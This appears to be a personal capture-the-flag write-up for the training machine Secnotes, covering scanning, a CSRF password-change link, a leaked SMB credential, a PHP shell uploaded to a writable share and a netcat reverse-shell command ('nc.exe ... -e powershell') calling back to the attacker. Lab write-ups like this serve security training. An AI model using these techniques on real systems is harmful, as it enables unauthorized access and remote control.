# Secnotes

10.10.10.97

![jerry](jerry.jpg)

# Enumerate

## Scan

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m01s, deviation: 4h02m29s, median: 1s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2020-06-21T10:52:18-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-21T17:52:22
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.66 seconds
```

## Enumerate Services

* Web:
  * No exploit for IIS 10. 
  * Webpage on 80 has a login page. Shows whether username is valid or not. 
  * Port 8808 is a default IIS welcome page? 
  * Running dirbuster on both. Didn't find much of interest. 
  * Can create a user and log in.
  * sqlmap on login and register return nothing. 
  * Web page takes forever to load because of some off vpn assets. Add them to the hosts file to make it not miserable. Didn't really help but apparently firefox and lower some timeouts in about:config to get it to go faster. Also doesn't seem to help much. Might help to get the dual networking thing going again. 
    * https://blog.djsdev.com/2020/03/add-htb-vpn-to-kali-20201-and-fix-vpn.html
* SMB: 
  * smbmap and client doesn't give anything.
  * smb-enum users and shares doesn't find anything. 

# Access

## Custom Notes

* Try to make a note with php code to see what happens. What a day for the response to find out. 
* Adding a function to a note caused the alert to show up. Make a shell now. 

```
<?php
function_alert("We welcome the New World");

function function_alert($msg) {
    echo "<script type='text/javascript'>alert('$msg');</script>";
}
?>
```

* PHP reverse shell script was too long apparently. Maybe it'll process JS script tags directly. 
* This works on it's own but doesn't help:

```
echo "<script type='text/javascript'>alert('$msg');</script>";
```

* Maybe I can have it download a php shell or exe so I can navigate to it? 

```
echo "$file_url = 'http://10.10.14.9/revshell.exe';";
echo "header('Content-Type: application/octet-stream');";
echo "header("Content-Transfer-Encoding: Binary"); ";
echo "header("Content-disposition: attachment; filename=\"" . basename($file_url) . "\"");";
echo "readfile($file_url);";
```

* Think I need to wrap it in php and remove echos. 
* That didn't show anything on the page, but didn't download the file. 
* Can I execute commands? Nope

```
<?php
$output = shell_exec('dir');
echo "<pre>$output</pre>";
?>
```

* Can I create files?

```
<?php
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$txt = "John Doe\n";
fwrite($myfile, $txt);
$txt = "Jane Doe\n";
fwrite($myfile, $txt);
fclose($myfile);
?> 
```

* So these are all actually showing up in the response html. So it looks like it's not actually parsing the php? Ya I'm way off base here, this doesn't get me anything. 

## PW Change

* Looks like it's just based on the session ID that it knows what user. 
* Apparently the dude will respond to links if you just type the url. Tried to add a hyperlink but just putting in the text and it works? 
* Sent tyler a link that includes the argument that I got from intercepting a change password request with burp. 

```
http://10.10.10.97/change_pass.php?password=1234567&confirm_password=1234567&submit=submit
```

* One relevant note:

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

* Looks like maybe I can mount that. 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Secnotes$ smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97
[+] IP: 10.10.10.97:445 Name: 10.10.10.97                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

* New-site is the 8808 page and I can write to it to upload a php shell. That php shell is a linux shell so that's not gonna work. 
* Figured out the directory we're in from having the php shell execute dir commands. 

```
dir /s iistart.htm
```

* Tried to do some windows stuff and having issues. Tried a powershell and got an error that it contains a virus. Maybe there's actually an AV blocking the others? Tried a few different ideas of reverse shells from this, but kept getting issues. 
  * https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
* Ippsec has a cool example of how to get simple command execution via a php request handler script. 
* Pipe powershell to nc for the command for windows reverse powershell through netcat. 

```
nc.exe 10.10.14.9 1235 -e powershell
```

# Escalate

## IIS -> Tyler

* Running scripts is disabled. 
* Had some issues with getting the download and run powershell command to work. Box is stopping it? 
* so... when I just changed the shell command in the php-reverse-shell, it connected back at IIS. But when I just upload a php script that directly calls nc, it returns as tyler. Weird. Seems like if I can upload files, just using nc and a direct call to exec in php is a good way to go. 

## Tyler -> Admin

* Should have gotten tyler right away, anyway, get flag now.
* winPEAS didn't find much.  
* See the bash.lnk and type it to find it's in win/sys32. 
* Can't make a stable reverse shell on the bash.exe using nc. 
* Can't just run bash the same way that they did? Not sure what's up. 
  * [x] Is there a difference between shell_exec and system in php? Not that I can tell. The system one didn't let me call bash either. Ya, there's no bash in that directory. 
* Could have also noticed that because it has bash, there's apparently some weird appdata folders that store the same stuff. 



# Lessons

* I guess try things like submit forms to see if there's some automation on the other side that people are responding to. 